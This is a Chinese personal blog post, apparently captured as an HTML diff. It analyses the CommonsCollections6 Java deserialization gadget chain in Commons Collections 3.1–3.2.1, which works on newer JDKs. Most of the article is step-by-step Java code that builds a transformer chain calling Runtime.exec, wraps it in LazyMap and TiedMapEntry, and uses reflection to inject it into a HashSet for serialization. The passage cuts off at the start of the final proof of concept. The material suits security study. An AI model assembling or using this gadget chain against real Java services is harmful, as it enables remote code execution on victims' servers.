@@ -1,0 +1,621 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CommonsCollections6 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CommonsCollections6前言前几天搞的CC1没成功弹出计算器，后来查找发现，是jdk版本问题，8u71之后已修复不可利用，主要原因是 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了 CommonsCollections6 解决了高版本 Jdk 的利用问题，所以来学习一下（主要是懒得安装其低版本的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections6">
+<meta property="og:url" content="http://example.com/2023/04/06/CommonsCollections6/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="CommonsCollections6前言前几天搞的CC1没成功弹出计算器，后来查找发现，是jdk版本问题，8u71之后已修复不可利用，主要原因是 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了 CommonsCollections6 解决了高版本 Jdk 的利用问题，所以来学习一下（主要是懒得安装其低版本的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png">
+<meta property="article:published_time" content="2023-04-06T06:19:07.000Z">
+<meta property="article:modified_time" content="2023-04-07T08:23:22.761Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/04/06/CommonsCollections6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CommonsCollections6',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-07 16:23:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/202304062210726.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CommonsCollections6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-06T06:19:07.000Z" title="发表于 2023-04-06 14:19:07">2023-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-07T08:23:22.761Z" title="更新于 2023-04-07 16:23:22">2023-04-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CommonsCollections6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天搞的CC1没成功弹出计算器，后来查找发现，是jdk版本问题，8u71之后已修复不可利用，主要原因是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了</p>
+<p>CommonsCollections6 解决了高版本 Jdk 的利用问题，所以来学习一下（主要是懒得安装其低版本的jdk）</p>
+<h2 id="利用链的限制条件："><a href="#利用链的限制条件：" class="headerlink" title="利用链的限制条件："></a>利用链的限制条件：</h2><p> JDK 版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
+<h2 id="利用链："><a href="#利用链：" class="headerlink" title="利用链："></a>利用链：</h2><pre><code>    Gadget chain:
+        java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+                        org.apache.commons.collections.map.LazyMap.get()
+                            org.apache.commons.collections.functors.ChainedTransformer.transform()
+                            org.apache.commons.collections.functors.InvokerTransformer.transform()
+                            java.lang.reflect.Method.invoke()
+                                java.lang.Runtime.exec()
+</code></pre>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老方法，看着利用链来往上分析，虽然有部分是和CC1是一样的，但是还是想分析巩固一下</p>
+<ul>
+<li>第一层 <code>java.lang.Runtime.exec()</code></li>
+</ul>
+<pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);
+</code></pre>
+<ul>
+<li>第二层<code>java.lang.reflect.Method.invoke()</code></li>
+</ul>
+<p>这个就是反射调用</p>
+<pre><code class="java">Runtime r = Runtime.getRuntime();
+Class c =Runtime.class;
+Method execMethod  = c.getMethod(&quot;exec&quot;,String.class);
+execMethod.invoke(r,&quot;calc&quot;);
+</code></pre>
+<p>因为Runtime⽆法序列化，<code>Runtime.class</code>是可以序列化的,所以改成这样</p>
+<pre><code class="java">Class c =Runtime.class;
+Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);
+Runtime r = (Runtime) getRuntime.invoke(null, null);
+Method exec = c.getMethod(&quot;exec&quot;, String.class);
+exec.invoke(r,&quot;calc&quot;);
+</code></pre>
+<ul>
+<li>第三层<code>org.apache.commons.collections.functors.InvokerTransformer.transform()</code></li>
+</ul>
+<p>这里查看一下<code>InvokerTransformer</code>这个类的<code>transform()</code>方法</p>
+<pre><code class="java">public Object transform(Object input) &#123;
+        if (input == null) &#123;
+            return null;
+        &#125;
+        try &#123;
+            Class cls = input.getClass();
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+            return method.invoke(input, iArgs);
+                
+        &#125; catch (NoSuchMethodException ex) &#123;
+            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
+        &#125; catch (IllegalAccessException ex) &#123;
+            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
+        &#125; catch (InvocationTargetException ex) &#123;
+            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);
+        &#125;
+    &#125;
+</code></pre>
+<p>这个方法，传入一个对象，在正常的情况下，通过反射，执行对象的方法，对比一下第二层就知道了，这里有点后门意思</p>
+<p>查看<code>InvokerTransformer</code>的构造方法，发现<code>iMethodName</code>,<code>iParamTypes</code>,<code>iArgs</code>这几个参数可控</p>
+<pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
+        super();
+        iMethodName = methodName;
+        iParamTypes = paramTypes;
+        iArgs = args;
+    &#125;
+</code></pre>
+<p>那么我们就可以这么构造，执行命令</p>
+<pre><code class="java">//Class c =Runtime.class;
+//Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);
+Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);
+//Runtime r = (Runtime) getRuntime.invoke(null, null);
+Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);
+//Method exec = c.getMethod(&quot;exec&quot;, String.class).invoke(r,&quot;calc&quot;);
+new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);
+</code></pre>
+<ul>
+<li>第四层<code>org.apache.commons.collections.functors.ChainedTransformer.transform()</code></li>
+</ul>
+<p>这一层相当于把上面一层的代码优化一下，可以发现上面执行命令的过程中，前一步的输出是后一步的输入</p>
+<p>查看<code>ChainedTransformer.transform()</code></p>
+<pre><code class="java">    public Object transform(Object object) &#123;
+        for (int i = 0; i &lt; iTransformers.length; i++) &#123;
+            object = iTransformers[i].transform(object);
+        &#125;
+        return object;
+    &#125;
+</code></pre>
+<p>这里就是实现了递归调用，把前一步的输出，当成后一步的输入</p>
+<p>查看<code>ChainedTransformer</code>的构造函数</p>
+<pre><code class="java">public ChainedTransformer(Transformer[] transformers) &#123;
+        super();
+        iTransformers = transformers;
+    &#125;
+</code></pre>
+<p>这里只要传进一个<code>transformers</code>数组,然后递归调用</p>
+<p>构造代码如下</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+&#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+chainedTransformer.transform(Runtime.class);
+</code></pre>
+<ul>
+<li>第五层<code>org.apache.commons.collections.map.LazyMap.get()</code></li>
+</ul>
+<p>查看<code>LazyMap</code>类,<code>LazyMap</code>是只要执行 get 方法就会调用<strong>transform</strong>，</p>
+<pre><code class="java">public Object get(Object key) &#123;
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) &#123;
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        &#125;
+        return map.get(key);
+    &#125;
+</code></pre>
+<p>这里可以看出，如果<code>factory</code>改为上层代码的<code>chainedTransformer</code>就可以执行命令了</p>
+<p>但是这里有个if判断，大概的意思是，如果map里面有<code>key</code>,直接返回，如果没有则进入判断，把value补上</p>
+<p>其中的<code>this.factory</code>对象，可以通过调用decorate(Map map, Transformer factory)方法，进而调用LazyMap(Map map, Factory factory)构造方法进行控制</p>
+<pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;
+        return new LazyMap(map, factory);
+    &#125;
+</code></pre>
+<pre><code class="java">protected LazyMap(Map map, Factory factory) &#123;
+        super(map);
+        if (factory == null) &#123;
+            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
+        &#125;
+        this.factory = FactoryTransformer.getInstance(factory);
+    &#125;
+</code></pre>
+<p>所以构造代码如下：</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+&#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+HashMap innermap = new HashMap();
+LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+map.get(Runtime.class);
+</code></pre>
+<ul>
+<li>第六层<code>org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</code></li>
+</ul>
+<p>查看<code>TiedMapEntry</code>类，里面只有<code>getValue()</code>调用了<code>get()</code></p>
+<pre><code class="java">public Object getValue() &#123;
+    return map.get(key);
+&#125;
+</code></pre>
+<p>查看构造方法</p>
+<pre><code class="java">public TiedMapEntry(Map map, Object key) &#123;
+    super();
+    this.map = map;
+    this.key = key;
+&#125;
+</code></pre>
+<p>发现<code>map</code>和<code>key</code>都是可以控制的</p>
+<p>所以构造方法如下：</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+      new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+      new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+      new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+&#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+HashMap innermap = new HashMap();
+LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+
+//只加了这两行
+TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);
+tiedmap.getValue();
+</code></pre>
+<ul>
+<li>第七层<code>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</code></li>
+</ul>
+<p>刚刚是使用了<code>TiedMapEntry.getValue()</code>, 在<code>TiedMapEntry</code>类中，有几个方法用到了<code>getValue()</code></p>
+<p>其中就有<code>hashCode()</code> ————–(为啥要用这个？到后面就知道了)</p>
+<pre><code class="java">public int hashCode() &#123;
+        Object value = getValue();
+        return (getKey() == null ? 0 : getKey().hashCode()) ^
+               (value == null ? 0 : value.hashCode()); 
+    &#125;
+</code></pre>
+<p>首先通过getValue()方法获取对象的值并赋给value变量，然后使用异或操作符 ^ 计算对象的哈希码。该方法的计算方式是将键（Key）的哈希码和值（Value）的哈希码异或在一起。</p>
+<p>所以把上面的<code>tiedmap.getValue();</code>改为<code>tiedmap.hashCode();</code>就行了</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+&#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+HashMap innermap = new HashMap();
+LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);
+
+//就改了这里
+tiedmap.hashCode();
+</code></pre>
+<ul>
+<li>第八层<code>java.util.HashMap.hash()</code></li>
+</ul>
+<p>查看<code>HashMap.hash()</code> </p>
+<pre><code class="java">static final int hash(Object key) &#123;
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+&#125;
+</code></pre>
+<p>该方法会判断传入的key是否为null，如果为null则直接返回0。如果key不为null，则通过key.hashCode()方法获取该Key的哈希码，并将结果存储在变量h中。然后将h和右移16位后的h按位异或运算( ^ )，得到最终的哈希码值并返回。</p>
+<p> 我们不需要它的返回结果，只要他执行hashCode()就行</p>
+<p>因为hash方法是HashMap类中的私有静态方法，无法从外部程序包中对其进行访问，可以用反射来调用它</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+HashMap innermap = new HashMap();
+LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);
+        
+//反射调用
+Class&lt;?&gt; hashMapClass = HashMap.class;
+Method hashMethod = hashMapClass.getDeclaredMethod(&quot;hash&quot;, Object.class);
+hashMethod.setAccessible(true);//设置访问权限
+hashMethod.invoke(null, tiedmap);
+</code></pre>
+<ul>
+<li>第九层<code>java.util.HashMap.put()</code></li>
+</ul>
+<p><code>put()</code>方法的代码如下</p>
+<pre><code class="java">public V put(K key, V value) &#123;
+    return putVal(hash(key), key, value, false, true);
+&#125;
+</code></pre>
+<p>这里只要我们只要put(tiedmap,”23131”)就可以触发hash(key)了，既hash(tiedmap)</p>
+<p>所以到这一层的代码构造如下：</p>
+<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
+     new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+     new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),
+     new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+&#125;;
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+HashMap innermap = new HashMap();
+LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);
+
+
+HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();
+hashMap.put(tiedmap,&quot;12333&quot;);
+</code></pre>
+<ul>
+<li>第十层<code>java.util.HashSet.readObject()</code></li>
+</ul>
+<p>很明显，这里已经是链子的末尾了，HashSet重写了<code>readObject()</code>,既反序列化入口</p>
+<p>先来看一下这个<code>readObject()</code>的代码</p>
+<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException &#123;
+    // Consume and ignore stream fields (currently zero).
+    s.readFields();
+    // Read capacity and verify non-negative.
+    int capacity = s.readInt();
+    if (capacity &lt; 0) &#123;
+        throw new InvalidObjectException(&quot;Illegal capacity: &quot; +
+                                         capacity);
+    &#125;
+
+    // Read load factor and verify positive and non NaN.
+    float loadFactor = s.readFloat();
+    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;
+        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
+                                         loadFactor);
+    &#125;
+    // Clamp load factor to range of 0.25...4.0.
+    loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f);
+
+    // Read size and verify non-negative.
+    int size = s.readInt();
+    if (size &lt; 0) &#123;
+        throw new InvalidObjectException(&quot;Illegal size: &quot; + size);
+    &#125;
+    // Set the capacity according to the size and load factor ensuring that
+    // the HashMap is at least 25% full but clamping to maximum capacity.
+    capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),
+            HashMap.MAXIMUM_CAPACITY);
+
+    // Constructing the backing map will lazily create an array when the first element is
+    // added, so check it before construction. Call HashMap.tableSizeFor to compute the
+    // actual allocation size. Check Map.Entry[].class since it&#39;s the nearest public type to
+    // what is actually created.
+
+    SharedSecrets.getJavaOISAccess()
+                 .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));
+
+    // Create backing HashMap
+    map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?
+           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
+           new HashMap&lt;E,Object&gt;(capacity, loadFactor));
+
+    // Read in all elements in the proper order.
+    for (int i=0; i&lt;size; i++) &#123;
+        @SuppressWarnings(&quot;unchecked&quot;)
+            E e = (E) s.readObject();
+        map.put(e, PRESENT);
+    &#125;
+</code></pre>
+<p>重点在这里，<code>s</code>是可控的，但是要如何确保<code>e</code>为我们想要的<code>tiedmap</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210181.png" alt="image-20230406205619715"></p>
+<p>这里的 map 实际上就是 HashMap </p>
+<pre><code class="java">private transient HashMap&lt;E,Object&gt; map;
+</code></pre>
+<p>那么当执行到了<code>E e = (E) s.readObject();</code>，这段代码中先反序列化TiedMapEntry对象tiedmap，TiedMapEntry的对象如下内容</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/202304071244516.png" alt="image-20230407124422576"></p>
+<p>这里可以看到map和key是可控的，但是这个map和key已经被我们构造好的payload进行了填充，</p>
+<p>看一下 <code>HashSet</code> 中的序列化过程（writeObject）是否可控</p>
+<p><code>HashSet.writeObject()</code>的代码如下</p>
+<pre><code class="java">private void writeObject(java.io.ObjectOutputStream s)
+    throws java.io.IOException &#123;
+    // Write out any hidden serialization magic
+    s.defaultWriteObject();
+
+    // Write out HashMap capacity and load factor
+    s.writeInt(map.capacity());
+    s.writeFloat(map.loadFactor());
+
+    // Write out size
+    s.writeInt(map.size());
+
+    // Write out all elements in the proper order.
+    for (E e : map.keySet())
+        s.writeObject(e);
+&#125;
+</code></pre>
+<p>传入的key是来自E e，这在writeObject中写明了来自其map成员</p>
+<p>而 <strong>map</strong> ，我们可以在 HashSet 中看到并没有一个直接的方法可以直接赋值修改的，这就又要用到反射了</p>
+<pre><code class="java">// 指定初始容量为1
+HashSet hashSet = new HashSet(1);
+hashSet.add(&quot;T0dis&quot;);
+// 反射获取HashSet中map的值
+Field HashSet_map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);
+// 取消访问限制检查
+HashSet_map.setAccessible(true);
+// 获取HashSet中map的值
+HashMap hashSetMap = (HashMap) HashSet_map.get(hashSet);
+</code></pre>
+<p>然后修改 hashSetMap 中的 key 值为 hashset</p>
+<pre><code class="java">// 反射获取 HashMap 中 table 的值
+Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);
+// 取消访问限制检查
+table.setAccessible(true);
+// 获取 HashMap 中 table 的值
+Object[] hashMapTable = (Object[]) table.get(hashSetMap);
+
+Object node = hashMapTable[0];
+if(node == null) &#123;
+      node = hashMapTable[1];
+&#125;
+
+// 将key 设为 tiedmap
+Field key =  node.getClass().getDeclaredField(&quot;key&quot;);
+key.setAccessible(true);
+key.set(node, tiedmap);
+</code></pre>
+<p>在这里利用反射获取了 hashSetMap 中的 table 属性，table 其实就是 hashmap 的存储底层，将 &lt;Key,Value&gt; 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为 tiedmap</p>
+<ul>
+<li>第十一层<code>java.io.ObjectInputStream.readObject()</code></li>
+</ul>
+<p>这个就是序列化的过程了</p>
+<p>序列化和反序列化的代码如下</p>
+<pre><code class="java">public static void serialize(Object obj) throws IOException&#123;
+    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+    oos.writeObject(obj);
+&#125;
+public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;
+    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+    Object obj = ois.readObject();
+    return obj;
+&#125;
+</code></pre>
+<h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import java.io.*;
+import java.lang.reflect.Field;
